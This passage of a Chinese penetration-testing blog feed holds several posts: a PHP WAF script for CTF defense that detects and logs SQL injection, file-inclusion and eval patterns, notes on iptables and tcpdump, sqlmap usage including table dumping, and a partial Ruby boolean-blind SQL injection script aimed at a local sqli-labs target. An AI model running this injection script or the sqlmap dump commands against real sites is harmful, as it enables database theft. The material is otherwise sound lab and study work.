class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;</span><span class="line">        <span class="hljs-variable">$ascii</span> = ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);</span><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ascii</span> &gt; <span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>) &#123; <span class="hljs-comment">//有中文这里要修改</span></span><span class="line">            <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(</span><span class="line">                <span class="hljs-number">9</span>,</span><span class="line">                <span class="hljs-number">10</span>,</span><span class="line">                <span class="hljs-number">13</span></span><span class="line">            ))) &#123;</span><span class="line">                write_attack_log(<span class="hljs-string">&quot;interrupt&quot;</span>);</span><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">                <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">            &#125;</span><span class="line">        &#125;</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-keyword">array</span>(</span><span class="line">        <span class="hljs-string">&quot;`&quot;</span>,</span><span class="line">        <span class="hljs-string">&quot;|&quot;</span>,</span><span class="line">        <span class="hljs-string">&quot;;&quot;</span>,</span><span class="line">        <span class="hljs-string">&quot;,&quot;</span></span><span class="line">    ) , <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;</span><span class="line">        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">        <span class="hljs-keyword">return</span> filter_0x25(<span class="hljs-variable">$str</span>);</span><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;</span><span class="line">    &#125;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|delete\b|dumpfile\b</span></span><span class="line"><span class="hljs-string">|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|m</span></span><span class="line"><span class="hljs-string">ultipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;sqli&quot;</span>);</span><span class="line">    &#125;</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> (substr_count(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>) &#123;</span><span class="line">        <span class="hljs-variable">$tmp</span> = str_replace(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>)) &#123;</span><span class="line">            write_attack_log(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;</span><span class="line">        &#125;</span><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;EXEC&quot;</span>);</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;</span><span class="line">        write_attack_log(<span class="hljs-string">&quot;GETFLAG&quot;</span>);</span><span class="line">    &#125;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">简单将易出现问题的字符替换成中文</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">获取http的请求包，意义在于获取别人的攻击payload</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"></br>) </span>&#123;</span><span class="line">    <span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="line">    <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>] . <span class="hljs-string">&quot;\r\n&quot;</span>;</span><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">        <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;</span><span class="line">            <span class="hljs-variable">$key</span> = substr(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>);</span><span class="line">            <span class="hljs-variable">$key</span> = str_replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>);</span><span class="line">            <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$key</span> . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;\r\n&quot;</span>;</span><span class="line">        &#125;</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-variable">$raw</span>.= <span class="hljs-string">&quot;\r\n&quot;</span>;</span><span class="line">    <span class="hljs-variable">$raw</span>.= file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>;</span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">这里拦截并记录攻击payload</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>) </span>&#123;</span><span class="line">    date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);</span><span class="line">    <span class="hljs-variable">$data</span> = date(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>) . <span class="hljs-string">&quot; --</span></span><span class="line"><span class="hljs-string">[&quot;</span> . <span class="hljs-variable">$alert</span> . <span class="hljs-string">&quot;]&quot;</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . get_http_raw() . <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;</span><span class="line">    <span class="hljs-variable">$ffff</span> = fopen(<span class="hljs-string">&#x27;log_is_a_secret_file.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径</span></span><span class="line">    fwrite(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);</span><span class="line">    fclose(<span class="hljs-variable">$ffff</span>);</span><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>) &#123;</span><span class="line">        header(<span class="hljs-string">&quot;location:http://172.16.9.2/&quot;</span>);</span><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="line">        sleep(<span class="hljs-number">15</span>); <span class="hljs-comment">//拦截前延时15秒</span></span><span class="line"></br></span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-meta">?&gt;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux 防火墙 IPTABLE</title>
      <link href="/2021/12/31/linux-%E9%98%B2%E7%81%AB%E5%A2%99-IPTABLE/"/>
      <url>/2021/12/31/linux-%E9%98%B2%E7%81%AB%E5%A2%99-IPTABLE/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>iptable 其实是netfilter的对外接口，内核防火墙其实是netfilter</p><p>iptable 有链和表的概念，还有包处于什么位置</p><p><img src="/2021/12/31/linux-%E9%98%B2%E7%81%AB%E5%A2%99-IPTABLE/1.png"></p><p>这就是iptable的运行图，有5个链：<br><code>prerouting</code> <code>forwording</code> <code>postrouting</code> <code>input</code> <code>output</code></p><p>有4个基本表：<br><code>raw</code> <code>mangle</code> <code>nat</code> <code>filter</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line"><span class="hljs-attribute">filter</span>表：负责过滤功能，防火墙；内核模块：iptables_filter</span><span class="line"></br></span><span class="line">nat表：network <span class="hljs-selector-tag">address</span> translation，网络地址转换功能；内核模块：iptable_nat</span><span class="line"></br></span><span class="line">mangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle</span><span class="line"></br></span><span class="line">raw表：关闭nat表上启用的连接追踪机制；iptable_raw</span></code></pre></div></div><h2 id="匹配规则"><a href="#匹配规则" class="headerlink" title="匹配规则"></a>匹配规则</h2><p>匹配规则分为标准匹配和扩展匹配，也就是基于IP和基于端口的匹配</p><h2 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">ACCEPT：允许数据包通过。</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">DROP</span>：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</span><span class="line"></br></span><span class="line">REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</span><span class="line"></br></span><span class="line">SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。</span><span class="line"></br></span><span class="line">MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</span><span class="line"></br></span><span class="line">DNAT：目标地址转换。</span><span class="line"></br></span><span class="line">REDIRECT：在本机做端口映射。</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">LOG</span>：在/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</span></code></pre></div></div><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ul><li><p>查看</p><ul><li><code>iptables -L</code> 默认就是查看filter 表的 INPUT 链</li><li><code>iptables -nvL INPUT --line-numbers</code>  查看详情</li></ul></li><li><p><a href="http://blog.51yip.com/linux/1404.html">这里</a>是iptables 的增删改查命令</p></li></ul><p>清除计数为<code>-Z</code></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tcpdump 常用参数</title>
      <link href="/2021/12/31/tcpdump-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/"/>
      <url>/2021/12/31/tcpdump-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><code>tcpdump tcp -i eth1 -n -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</code></p><blockquote><ul><li><p>tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型</p></li><li><p>-i eth1 : 只抓经过接口eth1的包</p></li><li><p>-t : 不显示时间戳</p></li><li><p>-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包</p></li><li><p>-c 100 : 只抓取100个数据包</p></li><li><p>dst port ! 22 : 不抓取目标端口是22的数据包</p></li><li><p>src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24</p></li><li><p>-w ./target.cap : 保存成cap文件，方便用ethereal(即wireshark)分析</p></li><li><p>-n 不显示解析地址</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap 特性</title>
      <link href="/2021/12/31/sqlmap-%E7%89%B9%E6%80%A7/"/>
      <url>/2021/12/31/sqlmap-%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://vul-hunters.oschina.io/hunter-blogs/posts/sec-tools-sqlmap/">参数介绍</a></li><li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">官网介绍</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-5254.html">sqlmap 进阶使用</a></li></ul><h2 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h2><p>使用方法：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line">sqlmap -u <span class="hljs-selector-attr">[url]</span> --tamper <span class="hljs-selector-attr">[模块名]</span></span></code></pre></div></div><p><code>--list-tampers </code></p><ul><li><a href="https://xz.aliyun.com/t/2746">这里</a>是tamper的常用脚本</li><li>自己写tamper脚本，放在<code>/usr/share/sqlmap/tamper</code></li></ul><hr><ul><li>过逗号的模块 <code>&quot;commalessmid,ifnull2casewhenisnull&quot;</code></li></ul><h2 id="前缀-–prefix"><a href="#前缀-–prefix" class="headerlink" title="前缀 –prefix"></a>前缀 –prefix</h2><p>当碰到类似<code>sprint</code>漏洞的时候，使用<code>--prefix</code>修改Payload的前缀<code>&#39;</code></p><ul><li><a href="https://paper.seebug.org/386/">这篇</a>是介绍<code>sprint</code>漏洞的<br>通过fuzz的方式发现<code>%</code>的返回多出了内容</li></ul><h2 id="sql-shell"><a href="#sql-shell" class="headerlink" title="--sql-shell"></a><code>--sql-shell</code></h2><ul><li><code>--sql-shell</code> 通过用sql语句的方法查看数据</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> count(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">distinct</span> table_schema) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>;</span></code></pre></div></div><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p><h2 id="r"><a href="#r" class="headerlink" title="-r"></a><code>-r</code></h2><p>可以直接使用整个请求包<br>注意里面报头不能有空行，从brupsuite 直接复制到vim会有空行是不行的，放到gedit再拿过来就好了。</p><p>或者<br><code>:g/^$/d</code></p><h2 id="指定数据库，表，来脱库"><a href="#指定数据库，表，来脱库" class="headerlink" title="指定数据库，表，来脱库"></a>指定数据库，表，来脱库</h2><p><code>-D &quot;security&quot; -T &quot;users&quot; --dump</code></p><h2 id="头部注入检测"><a href="#头部注入检测" class="headerlink" title="头部注入检测"></a>头部注入检测</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-1c codeBlockLines"><span class="line">--level=<span class="hljs-number">2</span> <span class="hljs-comment">// Attack the Cookie header</span></span><span class="line">--level=<span class="hljs-number">3</span> <span class="hljs-comment">// Attack the User-Agent header, as well as the Referer header</span></span><span class="line">--level=<span class="hljs-number">5</span> <span class="hljs-comment">// Attack the Host header</span></span></code></pre></div></div><p>不在列的属性只用在头部文件中使用<code>*</code> 就可以了</p><ul><li><a href="https://www.okiok.com/sql-injection-http-headers-sqlmap/">参考</a></li></ul><h2 id="清除session，重新扫描"><a href="#清除session，重新扫描" class="headerlink" title="清除session，重新扫描"></a>清除session，重新扫描</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-brainfuck codeBlockLines"><span class="line">--<span class="hljs-comment">flush</span><span class="hljs-literal">-</span><span class="hljs-comment">session</span> --<span class="hljs-comment">fresh</span><span class="hljs-literal">-</span><span class="hljs-comment">queries</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GET 单引号盲注脚本</title>
      <link href="/2021/12/31/GET-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/12/31/GET-%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;net/http&#x27;</span></span><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;byebug&#x27;</span></span><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;pp&#x27;</span></span><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./table&#x27;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># select * from users where id = &#x27;1&#x27; and length((select database())) &gt; 5;</span></span><span class="line"><span class="hljs-comment"># select * from users where id = &#x27;1&#x27; and ord(substr((select database()),1,1)) &gt; 40;</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Inject</span></span></span><span class="line"></br></span><span class="line">  URL = <span class="hljs-string">&#x27;http://localhost/Sqli_Edited_Version/sqlilabs/Less-8/?id=1&#x27;</span></span><span class="line"></br></span><span class="line">  SelectDatabase  = <span class="hljs-string">&#x27;select database()&#x27;</span></span><span class="line">  SelectTables = <span class="hljs-string">&quot;select table_name from information_schema.tables where table_schema = &#x27;%s&#x27; limit %d,1&quot;</span></span><span class="line"></br></span><span class="line">  SelectColumns = <span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_name = &#x27;%s&#x27; and table_schema = &#x27;%s&#x27; limit 0,1&quot;</span></span><span class="line"></br></span><span class="line">  SelectData = <span class="hljs-string">&quot;select concat_ws(&#x27;,&#x27;,%s) from %s limit %d,1&quot;</span></span><span class="line"></br></span><span class="line">  LengthPayload   = <span class="hljs-string">&quot;&#x27; and length((%s)) &gt; %d&quot;</span></span><span class="line">  SubstrPayload = <span class="hljs-string">&quot;&#x27; and ord(substr((%s),%d,1)) &gt; %d&quot;</span></span><span class="line"></br></span><span class="line">  Note = <span class="hljs-string">&#x27; +--+&#x27;</span></span><span class="line"></br></span><span class="line">  Key = <span class="hljs-string">&#x27;You are in...........&#x27;</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span></span></span><span class="line">    <span class="hljs-variable">@url</span> = URI(URL)</span><span class="line">    <span class="hljs-variable">@http</span> = Net::HTTP</span><span class="line">    <span class="hljs-variable">@info</span> = &#123;&#125;</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span></span></span><span class="line">    data_len = get_length(SelectDatabase)</span><span class="line">    <span class="hljs-comment">#puts &quot;Database Length: #&#123;data_len&#125;&quot;</span></span><span class="line"></br></span><span class="line">    data_name = get_name(SelectDatabase, data_len)</span><span class="line">    puts <span class="hljs-string">&quot;Database Name: <span class="hljs-subst">#&#123;data_name&#125;</span>&quot;</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:database</span>] = data_name</span><span class="line"></br></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># Tables Name</span></span><span class="line">    n = <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>] = &#123;&#125;</span><span class="line">    loop <span class="hljs-keyword">do</span></span><span class="line">      select_table_name = format(SelectTables, data_name, n)</span><span class="line">      len = get_length(select_table_name)</span><span class="line"></br></span><span class="line">      <span class="hljs-comment"># 当len为false时退出</span></span><span class="line">      <span class="hljs-keyword">break</span> <span class="hljs-keyword">unless</span> len</span><span class="line"></br></span><span class="line">      <span class="hljs-comment">#puts &quot;Table #&#123;n&#125; Length: #&#123;len&#125;&quot;</span></span><span class="line">      puts select_table_name</span><span class="line"></br></span><span class="line">      table_name = get_name(select_table_name, len)</span><span class="line">      puts <span class="hljs-string">&quot;Table <span class="hljs-subst">#&#123;n&#125;</span> Name: <span class="hljs-subst">#&#123;table_name&#125;</span>&quot;</span></span><span class="line">      <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][table_name] = &#123;&#125;</span><span class="line"></br></span><span class="line">      n += <span class="hljs-number">1</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># Columns</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>].each_pair <span class="hljs-keyword">do</span> <span class="hljs-params">|tb_name, _|</span></span><span class="line"></br></span><span class="line">      select_columns = format(SelectColumns, tb_name, <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:database</span>])</span><span class="line">      len = get_length(select_columns)</span><span class="line"></br></span><span class="line">      <span class="hljs-keyword">break</span> <span class="hljs-keyword">unless</span> len</span><span class="line"></br></span><span class="line">      puts select_columns</span><span class="line"></br></span><span class="line">      concat_columns = get_name(select_columns, len)</span><span class="line">      columns = concat_columns.split(<span class="hljs-string">&quot;,&quot;</span>)</span><span class="line">      <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][tb_name][<span class="hljs-symbol">:columns</span>] = columns</span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># Data</span></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>].each_pair <span class="hljs-keyword">do</span> <span class="hljs-params">|tb_name, hs|</span></span><span class="line"></br></span><span class="line">      columns = hs[<span class="hljs-symbol">:columns</span>]</span><span class="line">      n = <span class="hljs-number">0</span></span><span class="line">      <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][tb_name][<span class="hljs-symbol">:data</span>] = []</span><span class="line">      loop <span class="hljs-keyword">do</span></span><span class="line">        cs = columns.join(<span class="hljs-string">&#x27;,&#x27;</span>)</span><span class="line">        select_data = format(SelectData, cs, tb_name, n)</span><span class="line"></br></span><span class="line">        len = get_length(select_data)</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">break</span> <span class="hljs-keyword">unless</span> len</span><span class="line"></br></span><span class="line">        puts select_data</span><span class="line"></br></span><span class="line">        concat_data = get_name(select_data, len)</span><span class="line">        <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>][tb_name][<span class="hljs-symbol">:data</span>] &lt;&lt; concat_data.split(<span class="hljs-string">&#x27;,&#x27;</span>)</span><span class="line"></br></span><span class="line">        n += <span class="hljs-number">1</span></span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">    dump_data</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump_data</span><span class="hljs-params">(indent=<span class="hljs-number">2</span>)</span></span></span><span class="line"></br></span><span class="line">    <span class="hljs-variable">@info</span>[<span class="hljs-symbol">:tables</span>].each_pair <span class="hljs-keyword">do</span> <span class="hljs-params">|tb_name, hash|</span></span><span class="line"></br></span><span class="line">      col = hash[<span class="hljs-symbol">:columns</span>]</span><span class="line">      table = Table.new(</span><span class="line">        <span class="hljs-string">&#x27;Header&#x27;</span>=&gt; <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;tb_name&#125;</span> Table&quot;</span>,</span><span class="line">        <span class="hljs-string">&#x27;Indent&#x27;</span>=&gt; indent,</span><span class="line">        <span class="hljs-string">&#x27;Columns&#x27;</span>=&gt; col,</span><span class="line">        <span class="hljs-string">&#x27;CellPad&#x27;</span>=&gt; <span class="hljs-number">2</span>,</span><span class="line">        <span class="hljs-string">&#x27;SortIndex&#x27;</span>=&gt; <span class="hljs-number">2</span>)</span><span class="line"></br></span><span class="line">      hash[<span class="hljs-symbol">:data</span>].each <span class="hljs-keyword">do</span> <span class="hljs-params">|data|</span></span><span class="line">        table &lt;&lt; data</span><span class="line">      <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">      puts table.to_s + <span class="hljs-string">&quot;\n&quot;</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span><span class="hljs-params">(payload)</span></span></span><span class="line">    url = URI(URL + payload + Note)</span><span class="line">    <span class="hljs-variable">@http</span>.get_response(url)</span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_result</span><span 